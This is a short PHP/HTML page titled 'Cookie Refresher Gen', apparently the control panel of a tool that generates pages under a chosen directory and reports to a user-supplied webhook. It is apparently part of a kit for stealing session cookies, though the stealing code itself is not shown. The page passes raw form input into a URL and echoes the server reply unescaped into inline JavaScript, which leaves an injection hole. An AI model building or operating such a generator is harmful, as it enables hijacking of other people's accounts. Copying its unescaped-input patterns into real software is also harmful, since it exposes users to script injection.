<?php
$web = $_POST['web'];
$dir = $_POST['dir'];
if ($web) {
$do = $_SERVER['SERVER_NAME'];
$dom = "http://$do/controlPage/apis/cum.php?web=$web&dir=$dir";
$create =file_get_contents($dom);

if ($create == ""){
$js = 'Swal.fire({ title: "Good job!", text: "Check Your Webhook", icon: "success" });';
}else {
$js = 'Swal.fire({ title: "Error", text: "'.$create.'", icon: "error" });';
}
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
	<style>
	body,
	html {
		background: rgb(24, 24, 28) !important;
	}
	</style>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Create</title>
	<!-- CSS / Bootstrap -->
	<link href="/controlPage/new/assets/css/imports.css" rel="stylesheet">
	<!-- SNACKBAR -->
	<link rel="stylesheet" href="/controlPage/new/assets/css/snackbar.css" />
	<script src="/controlPage/new/assets/js/snackbar.js"></script>
	<style>
	    .swal2-container {
	        z-index: 20000 !important;
	    }
	</style>
</head>

<body>
<section id="login" class="form">
<div class="container h-100">
<div class="row justify-content-center align-items-center h-100">
<div class="col-md-10 col-lg-5">
<div class="login-box" data-aos="fade-up" data-aos-duration="1500">
<center><h2>Cookie Refresher Gen</h2></center>
<form method="post" id="login-form">
    
<div class="form-input-icon mb-3 mt-4"> <i class="fas fa-folder"></i>
<input class="auth-input" type="text" placeholder="Directory Name" name="dir" required> </div>

<div class="form-input-icon mb-3 mt-4"> <i class="fas fa-gear"></i>
<input class="auth-input" type="text" placeholder="Webhook" name="web" required> </div>
							
<button type="submit" class="button primary d-block mt-3 w-100" style="color:black">Generate</button>
						</form>
						<!-- ~LOGIN FORM -->
					</div>
				</div>
			</div>
		</div>
		<div class="overlay-top-right"></div>
		<div class="overlay-bottom-right"></div>
		<div class="overlay-bottom-left"></div>
	</section>
	<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
		<script>
	    <?php echo $js; ?>
	</script>
	<script src="/controlPage/js/jquery-3.3.1.min.js"></script>
	<script src="https://kit.fontawesome.com/44623006da.js" crossorigin="anonymous"></script>
	<script src="/controlPage/new/assets/js/bootstrap.js"></script>
	<script src="/controlPage/new/assets/js/core.js"></script>
</body>

</html>